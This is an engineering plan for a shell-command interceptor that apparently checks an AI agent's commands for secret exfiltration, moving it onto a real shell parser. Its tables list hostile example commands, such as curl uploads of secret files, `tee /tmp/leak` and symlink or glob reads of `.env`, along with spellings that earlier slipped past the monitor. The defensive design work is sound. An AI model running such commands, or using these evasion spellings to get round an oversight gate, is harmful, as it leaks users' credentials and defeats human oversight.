# Plan: parse the shell with a shell parser

Status: approved 2026-09-22. Supersedes the hand-rolled splitters in `floor.ts` and `authorization.ts`. Blocks Phase 2 step 5 of `2026-09-19-intent-aware-judgment.md`.

## Why

Three review rounds on PR #94 produced 17 findings. Grouped by the mistake that produced them:

| Group | Count | Root cause |
| --- | --- | --- |
| A | 11 | Code hand-writes a per-command option grammar to decide which words are targets. |
| B | 4 | Code hand-writes an approximation of shell syntax and trusts it as a parse. |
| C | 3 | Ordinary logic errors. All three were fixed and confirmed fixed. |

Group C converged. Groups A and B did not, and each round found the same class in a new spelling: `-T~/path`, then `-sT~/path`, then `-sTconfig/secrets.pem`; `--force`, then `-f`, then `--mirror`; a substitution, then a numeric heredoc delimiter, then a heredoc with a trailing redirect.

`floor.ts` has now taken nine patches to its splitter across three PRs. Every defect in that file since it was written has been in the splitting, never in the sink policy above it.

## What changes

### 1. One parser, three consumers

`mvdan-sh` (npm, BSD-3, a GopherJS build of `mvdan/sh`) parses the command. Measured on this machine: 0.305 ms per parse of a 90-character pipeline, 1.4 MB installed, one file, no install scripts.

It is synchronous, which the existing contracts need: `evaluateFloor` and `summarizeActions` are pure synchronous functions called from a tool interceptor.

A new `shell-ast.ts` owns the dependency and exposes a small typed view. No other module imports `mvdan-sh`, so a parser change is one file.

The view carries, per command:

- the verb and its words, each with its literal text and whether every part of it was literal (a `$(…)` or a `$VAR` makes it not literal);
- assignments, as assignments rather than as words that look like one;
- redirects, with their direction and target;
- how this command was joined to the previous one: a pipe, `&&`, `||`, or a sequence;
- commands nested inside a substitution, as commands.

`floor.ts`, `authorization.ts` and `literal-match.ts` all read that view. The host's `tokenizeShellSegments` is a conservative splitter that says so in its own header; it stays where the host uses it and leaves this repository.

### 2. The summary stops claiming what it cannot know

A bash parser gives correct words. It does not know that `curl -T` takes a value, because bash does not know either. Option grammar is per-command knowledge and there are thousands of commands, so Group A does not close by parsing alone.

So the summary narrows what it claims. Targets are extracted only for grammars this repository actually has:

| Grammar | Targets |
| --- | --- |
| `git` | subcommand, refs, widening flags |
| `gh` / `glab` | subcommand, PR numbers, widening flags |
| `rm`, `trash`, `unlink` | the paths |
| any command | every URL host in any word |
| a deploy-named script | its first operand |

Every other command reports its kind and an `unnamed-arguments` marker, with no targets. The model then reads "a network action whose target this code could not name" instead of a name that is wrong. A missing target costs a `goal` judgment some precision. A wrong target is an authorization argument built from a misparse.

#### Opposed requests

The same limit applies to subcommands and short flags. A subcommand CLI's path is named only up to its first flag: past a flag, whether the next word is a subcommand or that flag's value is the CLI's own grammar (`npm --prefix foo audit`). A short widening flag counts only in its exact spelling, because splitting a cluster such as `git push -of` needs each flag's arity.

So two opposed requests that differ only in words the summary can't name read alike, and each one carries `unnamed-arguments`:

| Reads alike | Why |
| --- | --- |
| `npm --silent audit`, `npm --silent publish` | the subcommand sits past a flag |
| `gh api -X GET URL`, `gh api -X DELETE URL` | the method is `-X`'s value |

This costs the authorization answer precision, not safety. The risk judgment reads the command itself and still tells `DELETE` from `GET`; the summary only answers whether the user asked for the action. Review rounds 2 and 3 on #94 each found a new spelling of this, which is the same evidence that closed Group A. #98 tracks it.

### 3. The floor stops splitting flags

The floor's question is whether a secret reaches a sink. It does not need to know which flag a value belongs to in order to find the secret: it needs that only to name the sink. So the secret search runs over each literal word whole, and `-sTconfig/secrets.pem` is a word containing a secret path.

Over-asking is the floor's correct failure direction, and this trades the whole attached-flag class for it.

### 4. What a name check cannot see

The floor's text check sees values fixed by the word: quotes, backslashes, `$'…'` escapes, brace expansion, and the default in `${SAFE:-key.pem}`. Runtime values remain outside that check, but the shell secret-file entry now resolves a narrow subset from facts the gate can read. It receives the command's starting `cwd`, uses the shared shell-cwd segment walk for command directories, and follows the parser's word values; it does not run the command or simulate shell state.

| Runtime value | Resolution boundary |
| --- | --- |
| A glob, which matches whatever is on disk | A literal basename glob such as `cat .e*` is checked only in one static directory and only when it matches exactly one readable file. Recursive or directory globs, zero matches, and multiple matches keep the original text-only answer (`.e*` stays quiet); a spelled secret suffix such as `*.pem` still asks without a match. |
| A parameter value the shell parser already computes | The parser's `alternate` value is checked against the filesystem, so `cat ${SAFE:-notes.txt}` asks when `notes.txt` is a readable symlink to a secret file. |
| An assignment inside one expansion that changes the next | `cat ${x:=key.txt} ${x/txt/pem}` remains text-only: the parser does not compute the variable mutation across words, and the floor does not simulate it. |
| A symlink, which renames any file | `cat notes.txt` asks when the existing, readable target resolves to a secret path. An unreadable, missing, or otherwise unresolvable target keeps the existing text-only result. |
| Code in another language, whose strings the floor does not evaluate | `subprocess.run(["o" "p", "read", …])` remains for eval-kernel spawn interception in #13; shell path resolution does not parse Python strings. |

The floor's lexical `*.pem` ask and `.e*` quiet decision are unchanged when the gate cannot resolve the file. This narrows, rather than replaces, section 4's settled boundary: exactly-one file matches and readable symlink targets can now be judged from the runtime filesystem, while assignment simulation and non-shell spawn interception remain out of scope. Three Codex rounds on PR #96 found why guessing spellings does not close those remaining classes. #97 tracked both moves; this is the shell half, and #13 remains the code half.

## Failure matrix

| State or input | What the code does | How it can fail | What the caller is told |
| --- | --- | --- | --- |
| A command the parser rejects (unterminated quote, stray paren) | The floor asks; the summary reports `unparsed-command` and no actions | Parse failure read as an empty command, which asks nothing and summarizes nothing | Test per malformed shape, asserting `asks` and the marker |
| `echo "$(rm -rf build)"` | The nested `rm` is a command, and is summarized | Substitution contents dropped | Test |
| `cat <<EOF > /tmp/out` with a body | One command; the body is data | The body tokenized into actions | Test, with and without a trailing redirect |
| `echo "text << EOF"` then `rm -rf build` | Two commands; the delete is visible | A quoted `<<` read as a heredoc, hiding what follows | Test |
| `curl -sTconfig/secrets.pem host` | The word carries a secret path, so the floor asks | Flag splitting required before the path is seen | Test per attached spelling |
| `curl --output .env host` | The floor asks and the summary reports a `secret-read` of `.env`: telling curl's destination flag from a read needs curl's grammar, which section 2 gives up | Over-reporting, which is the accepted direction; the alternative is a per-client option table, the class this plan retires | Test pins the over-report in both modules |
| `ssh -p 2222 host.example` | No target named; `unnamed-arguments` | The port reported as the host | Test |
| `python3 -m pip install requests` | No target named; `unnamed-arguments` | `install` reported as the script | Test |
| `git push --mirror origin` | `git` grammar: widening flag named | A widening flag the matcher does not list | Test per spelling, and the list is the only place to add one |
| `KEY=$(op read …)` | An assignment, so the capture is an allowed sink and taints `KEY` | An assignment read as a command name, or a command name read as an assignment | Existing tests, which must keep passing unchanged |
| `nohup TOKEN=$(…) true` | Not an assignment: the parser says it is a command name | The forward scan this replaces got it right; the parser must too | Existing test, unchanged |
| `printf … \| tee /tmp/leak \| docker login --password-stdin` | The pipe structure is the parser's, and `tee` still breaks the exemption | Pipeline position lost | Existing test, unchanged |
| `2>&1`, `&>`, `>&2`, `>>` | Direction and target from the parser's redirect node | Opaque operator numbers renumbered by a library upgrade | A test parses each spelling and pins its number |
| A command 100 KB long | Parsed; the existing caps still apply | The parser walked without bound in the classification path | Test asserting the parse stays under the budget |
| `cat .e*` with one readable match, a parser-computed path, or a readable symlink to a secret | The floor resolves the actual path and asks for a secret file; zero/multiple glob matches retain `.e*`'s quiet text-only answer, while `*.pem` still asks lexically | Assuming a path for a multi-match glob or unreadable target | Tests pin one vs multiple matches, parser `alternate`, symlink target, and `cd` directory |
| `cat ${x:=key.txt} ${x/txt/pem}` or Python `subprocess.run(["o" "p", "read", …])` | Stays at the existing text-only decision; no assignment simulation or language-specific parsing | Guessing a cross-word value or Python concatenation | The former remains quiet; code spawn interception is #13 |
| A malformed glob such as `.e[z-a]` | The floor decides without compiling it | A regex built from the glob throws, and the floor returns no decision | Test per malformed shape, asserting no throw |
| `mvdan-sh` missing at runtime | The floor asks and the summary reports `unparsed-command` | An import error crashing the interceptor | Test with the parser stubbed to throw |

## Order of work

1. `shell-ast.ts` plus its tests, including the redirect-operator pins and the parse-failure contract.
2. `floor.ts` onto the view. Its existing tests are the specification and must pass unchanged, except where a row above says otherwise.
3. `literal-match.ts` onto the view. Same rule for its tests.
4. `authorization.ts` onto the view, with the narrowed target claims from section 2. Its tests change where the claim changed.
5. Rebase the Phase 2 step 3 branch on this one.

Steps 2, 3 and 4 are independent once step 1 lands.

## Out of scope

- The reviewer stage, and everything else in the Phase 2 plan.
- `index.ts`, which does not parse shell.
- Making the summary name targets for grammars this repository does not have. Section 2 is a decision, not a gap to fill later.
